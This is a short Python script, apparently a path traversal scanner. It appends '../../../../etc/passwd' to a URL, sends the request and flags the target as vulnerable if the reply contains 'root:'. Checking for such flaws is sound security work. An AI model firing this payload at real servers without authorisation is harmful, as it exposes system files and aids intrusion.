import requests

def scan(url):
    payload = "../../../../etc/passwd"
    vulnerable = False

    try:
        response = requests.get(url + payload)
        if "root:" in response.text:
            vulnerable = True
    except:
        pass

    return "Vulnerable" if vulnerable else "Not Vulnerable"
